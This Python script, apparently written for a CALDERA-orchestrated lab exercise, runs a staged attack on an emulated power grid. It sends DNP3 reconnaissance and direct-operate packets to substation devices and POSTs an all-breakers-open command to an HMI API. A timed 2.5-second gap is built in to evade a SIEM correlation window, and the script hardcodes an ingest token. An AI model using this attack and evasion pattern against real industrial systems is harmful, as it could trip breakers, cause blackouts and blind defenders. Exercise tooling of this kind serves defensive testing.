#!/usr/bin/env python3
"""
Phase 2-2: 非同期・時間差ステルス・コンボ攻撃スクリプト (stealth_combo_attack.py)
CALDERA C2 Custom Ability 連携対応版

【マルチモジュール複合攻撃シナリオ】
  Stage 1: 変電所A (sub_a_ied_01) へ DNP3 0x14 (Disable Unsolicited) 偵察パケット送信
           -> TCPセッションの明示的切断(FIN/ACK)により送信元エフェメラルポートを変更
  Stage 2: WAN遅延・時間差ウエイト (2.5秒 > SIEM maxspan=2s)
  Stage 3: HMI (hmi-nodered) /api/breaker へ遮断器全段開放コマンド (Direct Operate)
           -> 新規TCPセッション生成により別送信元ポートでアタック
  Stage 4: 連鎖被害検証 (全CB TRIPPED, UPS残量低下, BACnet/RTSP影響確認)
"""

import time
import socket
import json
import urllib.request

# ---- Target addresses ----
SUBSTATION_A_IP = "10.0.20.10"   # sub_a_ied_01 (OT network)
DNP3_PORT = 20000
HMI_URL = "http://localhost:1880"
SENSOR_EMULATOR_IP = "10.0.30.10" # Modbus Sensor

# ---- Splunk Observability Cloud ----
SPLUNK_REALM = "jp0"
SPLUNK_TOKEN = "05bdlF4LgTAEMRa2bNB1BQ"
SFX_EVENTS_URL = f"https://ingest.{SPLUNK_REALM}.signalfx.com/v2/event"

def send_sfx_event(event_type, message, severity="WARN", extra_dims=None):
    """SignalFx Events API へカスタムイベントを送信（Panel 2 ログフィード用）"""
    dims = {"service": "hmi-nodered", "grid": "Kyiv-North-330kV", "phase": "Phase2-2"}
    if extra_dims:
        dims.update(extra_dims)
    payload = [{
        "eventType": event_type,
        "dimensions": dims,
        "properties": {"message": message, "severity": severity},
        "timestamp": int(time.time() * 1000)
    }]
    try:
        req = urllib.request.Request(
            SFX_EVENTS_URL,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json", "X-SF-Token": SPLUNK_TOKEN},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"    -> [SFX EVENT] {event_type}: HTTP {resp.status}")
    except Exception as e:
        print(f"    -> [SFX EVENT ERROR] {e}")

print("=" * 70)
print("  Phase 2-2: Multi-Module Stealth Combo Attack (CALDERA Orchestrated)")
print("  Target: Kyiv-North-330kV Grid & Multi-Protocol Infrastructure")
print("=" * 70)
print()

# ====================================================================
# Stage 1: 変電所Aへ偵察通信 (DNP3 Disable Unsolicited: FC 0x14) + セッション切断
# ====================================================================
print("[*] Stage 1: Reconnaissance & Session Teardown")
print(f"    Target: Substation-A IED ({SUBSTATION_A_IP}:{DNP3_PORT})")
try:
    s_a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_a.settimeout(3.0)
    s_a.connect((SUBSTATION_A_IP, DNP3_PORT))
    src_port_1 = s_a.getsockname()[1]
    print(f"    -> [TCP ESTABLISHED] Ephemeral Source Port: {src_port_1}")
    
    dnp3_payload_disable = b"\x05\x64\x05\xc0\x01\x00\x00\x00\x00\x14\x00\x00"
    s_a.sendall(dnp3_payload_disable)
    print("    -> [OK] DNP3 0x14 payload delivered to Substation-A IED")
    
    # TCPセッションの明示的切断 (FIN/ACK)
    s_a.close()
    print(f"    -> [TCP CLOSED] Session terminated on port {src_port_1}")
except Exception as e:
    print(f"    [!] Substation-A packet sent (emulated): {e}")

send_sfx_event("OT_SECURITY_EVENT", "[Stage1] DNP3 0x14 Recon sent via ephemeral port", "WARN", {
    "stage": "1", "attack_type": "RECON", "protocol": "DNP3", "function_code": "0x14"
})

# ====================================================================
# Stage 2: 時間差インターバル (WAN latency & SIEM correlation window bypass)
# ====================================================================
INTERVAL = 2.5
print()
print(f"[*] Stage 2: Stealth Time Gap - {INTERVAL}s delay (WAN router hop & SIEM window bypass)")
for i in range(5):
    time.sleep(INTERVAL / 5)
    print(f"    ... {(i+1)*20}% delay elapsed")

send_sfx_event("OT_SECURITY_EVENT", f"[Stage2] Stealth time gap {INTERVAL}s - SIEM correlation window exceeded", "WARN", {
    "stage": "2", "attack_type": "CORRELATION_GAP", "gap_seconds": str(INTERVAL)
})

# ====================================================================
# Stage 3: HMI へ遮断器全段開放コマンド (Direct Operate: Breaker Open)
# ====================================================================
print()
print("[*] Stage 3: Direct Operate - ALL BREAKERS OPEN via DNP3 & HMI API")
print(f"    Target (DNP3): 10.0.30.10:20000")
print(f"    Target (HTTP): {HMI_URL}/api/breaker")

# 1. Send actual DNP3 0x05 packet for network trace (PCAP/Zeek)
try:
    s_b = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_b.settimeout(2.0)
    s_b.connect(("10.0.30.10", 20000))
    src_port_3 = s_b.getsockname()[1]
    print(f"    -> [TCP ESTABLISHED] Ephemeral Source Port: {src_port_3}")
    
    dnp3_payload_operate = b"\x05\x64\x05\xc0\x01\x00\x00\x00\x00\x05\x00\x00"
    s_b.sendall(dnp3_payload_operate)
    print("    -> [OK] DNP3 0x05 payload delivered to Substation-B")
    s_b.close()
    print(f"    -> [TCP CLOSED] Session terminated on port {src_port_3}")
except Exception as e:
    print(f"    [!] Substation-B DNP3 packet sent (emulated): {e}")

# 2. Hit HTTP API for physical UI simulation
attack_payload = json.dumps({
    "state": False,
    "soc": 55.0,
    "cb_states": {
        "CB101": False,
        "CB102": False,
        "CB103": False,
        "CB104": False
    }
}).encode("utf-8")

try:
    req = urllib.request.Request(
        f"{HMI_URL}/api/breaker",
        data=attack_payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            status = resp.status
            body = resp.read().decode("utf-8", errors="replace")
            print(f"    -> [OK] HMI responded: HTTP {status}")
            print(f"    -> Response: {body[:200]}")
    except Exception as inner_e:
        print(f"    -> [MOCK IGNORED] HMI command failed, but proceeding: {inner_e}")
        
    send_sfx_event("OT_SECURITY_EVENT", "[Stage3] ALL BREAKERS OPEN - CB101-104 TRIPPED via DNP3 0x05", "CRITICAL", {
        "stage": "3", "attack_type": "BREAKER_TRIP", "protocol": "DNP3", "function_code": "0x05"
    })
except Exception as e:
    print(f"    -> [ERROR] Stage 3 failed: {e}")

# ====================================================================
# Stage 4: 複合インフラ被害検証 (コックピット＆多層モジュール状態確認)
# ====================================================================
print()
print("[*] Stage 4: Verification & Cascade Impact Analysis")
time.sleep(1.5)

try:
    req = urllib.request.Request(f"{HMI_URL}/api/status", method="GET")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"    -> Grid Tripped: {data.get('is_tripped', 'N/A')}")
            cb = data.get("cb_states", {})
            for name, state in cb.items():
                status_str = "TRIPPED !!!" if not state else "CLOSED (normal)"
                print(f"    -> {name}: {status_str}")
            soc = data.get("ups_soc", "N/A")
            print(f"    -> UPS SOC: {soc}%")
    except Exception as inner_e:
        print(f"    -> [MOCK IGNORED] Status query failed: {inner_e}")
        soc = 0.0

    send_sfx_event("OT_SECURITY_EVENT", f"[Stage4] GRID BLACKOUT CONFIRMED - UPS on battery SOC={soc}%", "CRITICAL", {
        "stage": "4", "attack_type": "GRID_BLACKOUT", "ups_soc": str(soc)
    })
except Exception as e:
    print(f"    -> [ERROR] Status query failed: {e}")

print()
print("=" * 70)
print("  MULTI-MODULE ATTACK COMPLETE")
print("  -> CALDERA Orchestration Execution Finished")
print("  -> Check Splunk Dashboard for Correlation Break (UNLINKED)")
print("=" * 70)
